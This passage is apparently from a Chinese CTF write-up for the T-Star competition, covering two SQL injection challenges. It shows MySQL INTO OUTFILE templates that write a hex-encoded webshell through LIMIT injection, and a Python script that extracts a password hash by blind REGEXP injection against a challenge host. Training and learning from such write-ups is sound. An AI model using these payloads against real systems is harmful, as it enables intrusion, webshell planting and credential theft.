<h2 id="9-SQL注入1"><a href="#9-SQL注入1" class="headerlink" title="9.SQL注入1"></a>9.SQL注入1</h2><p>群里大佬提出是limit注入写文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INTO OUTFILE &#39;物理路径&#39; lines terminated by  （一句话hex编码）</span><br><span class="line">INTO OUTFILE &#39;物理路径&#39; fields terminated by （一句话hex编码）</span><br><span class="line">INTO OUTFILE &#39;物理路径&#39; columns terminated by （一句话hex编码）</span><br><span class="line">INTO OUTFILE &#39;物理路径&#39; lines starting by    （一句话hex编码）</span><br></pre></td></tr></table></figure>

<p>前提：开启secure-file-priv以及有写的权限就可以进行limit写shell</p>
<h2 id="10-SQL注入2"><a href="#10-SQL注入2" class="headerlink" title="10.SQL注入2"></a>10.SQL注入2</h2><p>御剑扫wwwroot.zip，过滤方法中看到过滤的比较凶。赛后通过第一名战队的wp来看，应该是异或注入。猜测账号密码图片都在同一个数据库表中。通过poc猜解出password的hash。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">a &#x3D;[&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;]</span><br><span class="line">temp &#x3D; &#39;&#39;</span><br><span class="line">while(1):</span><br><span class="line">    for i in a:</span><br><span class="line">        url &#x3D; &#39;http:&#x2F;&#x2F;23dcf1dc.yunyansec.com&#x2F;picture.php?id&#x3D;3&quot; or password REGEXP &#39;+&#39;\&#39;^&#39;+temp+i+&#39;\&#39; %23&#39;</span><br><span class="line">        r &#x3D; requests.get(url)</span><br><span class="line">        if &#39;not found&#39; not in r.text:</span><br><span class="line">            temp &#x3D; temp+i</span><br><span class="line">            print (temp)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200820/15979139726157.png" alt="image-20200703152040620"></p>
<p>二十位的hash，可能为dedecms，然后去掉前三位跟后一位然后md5解密得到密码，登录拿到flag。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">详细sql1解法，第一名战队的wp：https:&#x2F;&#x2F;0xfire.me&#x2F;2020&#x2F;06&#x2F;30&#x2F;T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B&#x2F;</span><br><span class="line">github中也有SQL1的解题方法：https:&#x2F;&#x2F;github.com&#x2F;XDSEC&#x2F;xdsec_ctf&#x2F;tree&#x2F;494b53d388186e8be21e753bb2048362842280c1&#x2F;xdctf2015&#x2F;izyCTF</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>T-Star高校挑战赛</tag>
      </tags>
  </entry>
</search>
